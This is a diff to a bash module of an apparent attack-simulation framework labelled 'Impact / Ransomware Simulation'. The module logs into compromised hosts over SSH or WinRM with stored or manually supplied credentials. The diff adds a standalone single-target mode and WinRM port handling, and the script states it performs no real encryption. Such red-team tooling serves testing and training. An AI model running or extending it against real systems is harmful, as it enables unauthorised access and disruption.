@@ -26,6 +26,19 @@ set -u
 #   No cryptographic encryption is performed.
 # ============================================================
 
+# ============================================================
+# MRNOBODY ATTACK METADATA
+# ============================================================
+
+# ATTACK_ID="07"
+# ATTACK_NAME="Impact / Ransomware Simulation"
+# ATTACK_ALIAS="impact"
+# ATTACK_STANDALONE="true"
+# ATTACK_PARAMETERS="target,port,protocol,username,password"
+# ATTACK_CAMPAIGN_STATE="compromised-hosts"
+
+# MITRE_TACTIC="Impact"
+# MITRE_TECHNIQUES="T1486"
 
 # ============================================================
 # PATHS / CONFIG
@@ -56,6 +69,18 @@ INCIDENT_ID="${NORDIC_INCIDENT_ID:-H3-$(date +%Y%m%d-%H%M%S)}"
 SSH_PASSWORD="${NORDIC_SSH_PASSWORD:-$NORDIC_DEFAULT_SSH_PASSWORD}"
 
 RDP_PASSWORD="${NORDIC_RDP_PASSWORD:-$NORDIC_DEFAULT_RDP_PASSWORD}"
+
+# ============================================================
+# EXECUTION MODE
+# ============================================================
+
+RUN_MODE="${MRNOBODY_RUN_MODE:-campaign}"
+
+MANUAL_TARGET="${MRNOBODY_TARGET:-}"
+MANUAL_PORT="${MRNOBODY_PORT:-}"
+MANUAL_PROTOCOL="${MRNOBODY_PROTOCOL:-}"
+MANUAL_USERNAME="${MRNOBODY_USERNAME:-}"
+MANUAL_PASSWORD="${MRNOBODY_PASSWORD:-}"
 
 WINRM_HTTP_PORT="${NORDIC_WINRM_HTTP_PORT:-${NORDIC_DEFAULT_WINRM_HTTP_PORT:-5985}}"
 WINRM_HTTPS_PORT="${NORDIC_WINRM_HTTPS_PORT:-${NORDIC_DEFAULT_WINRM_HTTPS_PORT:-5986}}"
@@ -127,25 +152,43 @@ done
 # WINDOWS SUPPORT
 # ============================================================
 
+PYTHON_BIN="/opt/nordic-attack/venv/bin/python"
+
 PYWINRM_AVAILABLE=0
 
-if python3 -c "import winrm" >/dev/null 2>&1; then
+if "$PYTHON_BIN" -c "import winrm" >/dev/null 2>&1; then
     PYWINRM_AVAILABLE=1
 fi
-
 
 # ============================================================
 # VALIDATION
 # ============================================================
 
-if [[ ! -f "$COMPROMISED_STATE" ]]; then
+if [[ "$RUN_MODE" == "campaign" ]]; then
 
-    echo "[ERROR] Missing compromised host inventory:"
-    echo "$COMPROMISED_STATE"
-    echo
-    echo "Run Phase 03 first."
+    if [[ ! -f "$COMPROMISED_STATE" ]]; then
 
+        echo "[ERROR] Missing compromised host inventory:"
+        echo "$COMPROMISED_STATE"
+        echo
+        echo "Run Phase 03 first."
+
+        exit 1
+    fi
+
+elif [[ "$RUN_MODE" == "standalone" ]]; then
+
+    if [[ -z "$MANUAL_TARGET" ]]; then
+
+        echo "[ERROR] Standalone mode requires --target"
+        exit 1
+    fi
+
+else
+
+    echo "[ERROR] Unknown run mode: $RUN_MODE"
     exit 1
+
 fi
 
 
@@ -159,9 +202,13 @@ fi
 # Old SSH-only state remains supported.
 # ============================================================
 
-mapfile -t COMPROMISED < <(
+COMPROMISED=()
 
-    python3 - "$COMPROMISED_STATE" <<'PY'
+if [[ "$RUN_MODE" == "campaign" ]]; then
+
+    mapfile -t COMPROMISED < <(
+
+        python3 - "$COMPROMISED_STATE" <<'PY'
 import json
 import sys
 
@@ -212,13 +259,15 @@ for host in data.get("hosts", []):
             or host.get("ssh_user")
             or "ubuntu"
         )
+
         password = (
             host.get("ssh_password")
             or host.get("password")
             or ""
         )
+
         print(
-           f"{ip}|linux|ssh|{port}|{user}|{password}"
+            f"{ip}|linux|ssh|{port}|{user}|{password}"
         )
 
 
@@ -234,18 +283,17 @@ for host in data.get("hosts", []):
             or host.get("rdp_user")
             or "Administrator"
         )
+
         password = (
             host.get("rdp_password")
             or host.get("password")
             or ""
         )
+
         print(
-           f"{ip}|windows|rdp|{port}|{user}|{password}"
+            f"{ip}|windows|rdp|{port}|{user}|{password}"
         )
 
-    # --------------------------------------------------------
-    # FreeBSD / OPNsense
-    # --------------------------------------------------------
 
     elif platform == "freebsd":
 
@@ -272,8 +320,44 @@ for host in data.get("hosts", []):
 
 PY
 
-)
+    )
 
+elif [[ "$RUN_MODE" == "standalone" ]]; then
+
+    case "${MANUAL_PROTOCOL,,}" in
+
+        ssh|"")
+            PLATFORM="linux"
+            ACCESS="ssh"
+            ACCESS_PORT="${MANUAL_PORT:-22}"
+            ACCESS_USER="${MANUAL_USERNAME:-ubuntu}"
+            ;;
+
+        winrm|winrm-http)
+            PLATFORM="windows"
+            ACCESS="winrm"
+            ACCESS_PORT="${MANUAL_PORT:-5985}"
+            ACCESS_USER="${MANUAL_USERNAME:-Administrator}"
+            ;;
+
+        winrm-https)
+            PLATFORM="windows"
+            ACCESS="winrm"
+            ACCESS_PORT="${MANUAL_PORT:-5986}"
+            ACCESS_USER="${MANUAL_USERNAME:-Administrator}"
+            ;;
+
+        *)
+            echo "[ERROR] Unsupported standalone protocol: $MANUAL_PROTOCOL"
+            exit 1
+            ;;
+    esac
+
+    COMPROMISED=(
+        "${MANUAL_TARGET}|${PLATFORM}|${ACCESS}|${ACCESS_PORT}|${ACCESS_USER}|${MANUAL_PASSWORD}"
+    )
+
+fi
 
 # ============================================================
 # BANNER
@@ -688,18 +772,27 @@ REMOTE
         WINRM_PORT=""
         WINRM_SCHEME=""
 
+        if [[ "$ACCESS_PORT" == "$WINRM_HTTPS_PORT" ]] &&
+        tcp_open "$HOST" "$ACCESS_PORT"; then
 
-        if tcp_open "$HOST" "$WINRM_HTTP_PORT"; then
+            WINRM_PORT="$ACCESS_PORT"
+            WINRM_SCHEME="https"
+
+        elif [[ "$ACCESS_PORT" == "$WINRM_HTTP_PORT" ]] &&
+            tcp_open "$HOST" "$ACCESS_PORT"; then
+
+            WINRM_PORT="$ACCESS_PORT"
+            WINRM_SCHEME="http"
+
+        elif tcp_open "$HOST" "$WINRM_HTTP_PORT"; then
 
             WINRM_PORT="$WINRM_HTTP_PORT"
             WINRM_SCHEME="http"
-
 
         elif tcp_open "$HOST" "$WINRM_HTTPS_PORT"; then
 
             WINRM_PORT="$WINRM_HTTPS_PORT"
             WINRM_SCHEME="https"
-
 
         else
 
@@ -726,7 +819,7 @@ REMOTE
 
         WINDOWS_RESULT="$(
             NORDIC_WINRM_PASSWORD="$ACCESS_PASSWORD" \
-            python3 - \
+            "$PYTHON_BIN" - \
                 "$HOST" \
                 "$WINRM_PORT" \
                 "$WINRM_SCHEME" \
@@ -1071,6 +1164,7 @@ PY
                 tail -n 1
             )"
 
+            RESULT_LINE="${RESULT_LINE//$'\r'/}"
 
             IFS='|' read -r \
                 STATUS \
@@ -1180,7 +1274,7 @@ with open(
 
     for line in f:
 
-        line = line.rstrip("\n")
+        line = line.rstrip("\r\n")
 
         if not line:
             continue
